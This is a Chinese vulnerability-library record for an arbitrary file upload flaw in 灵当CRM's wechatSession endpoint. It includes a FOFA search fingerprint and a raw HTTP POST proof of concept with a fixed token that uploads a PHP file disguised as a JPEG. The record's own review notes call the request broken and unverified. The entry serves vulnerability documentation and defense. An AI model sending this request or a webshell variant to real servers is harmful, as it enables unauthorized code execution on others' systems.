---
source: "wy876 漏洞文库"
title: "灵当CRM wechatSession token上传PHP"
product: "灵当CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "固定token及日期路径，版本未知"
prerequisites: "携token，匿名可用性未证"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/fq1csz1qt7nm1lgc"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%81%B5%E5%BD%93CRM/%E7%81%B5%E5%BD%93crmwechatSession%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "body="
id: "vw-cd5662a74a7189b978e60360"
entity_id: "ve-cd5662a74a7189b978e60360"
schema_version: "1"
---

# 灵当CRM wechatSession token上传PHP

## 条目说明

- 对象与具体问题：灵当CRM；wechatSession token上传PHP
- 版本、配置及部署条件：固定token及日期路径，版本未知
- 认证与权限前提：携token，匿名可用性未证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Content-Length10338与短正文不符且multipart末端缺--，请求破损
- phpinfo无响应/执行结果，路径双斜杠规范化；固定token不保证跨站有效
- FOFA Markdown污染，无修复版本

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
灵当CRM（Customer Relationship Management，客户关系管理）是一款面向中小企业的客户关系管理软件，旨在帮助企业更好地管理客户信息、销售流程、市场营销和服务支持等方面的工作。灵当CRM提供了一系列工具和功能，帮助企业在销售、市场和服务部门之间实现高效协作，提高客户满意度和业务效率。灵当crm wechatSession存在任意文件上传漏洞。

## 二、影响版本
+ 灵当crm

## 三、资产测绘
+ fofa`body="[http://localhost:8088/crm/index.php"](http://localhost:8088/crm/index.php") && body="ldcrm.base.js"`
+ 特征


## 四、漏洞复现
```http
POST /crm/wechatSession/index.php?token=9b06a9617174f1085ddcfb4ccdb6837f&msgid=1&operation=upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Content-Type: multipart/form-data; boundary=---------------------------45250802924973458471174811279
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate

-----------------------------45250802924973458471174811279
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>
-----------------------------45250802924973458471174811279
```

> 请求长度说明：原资料 Content-Length 为 10338；静态长度已移除，应由客户端根据最终请求体的字节数生成。


```plain
/crm//storage//wechatsession//2024//10//14//1.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fq1csz1qt7nm1lgc>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
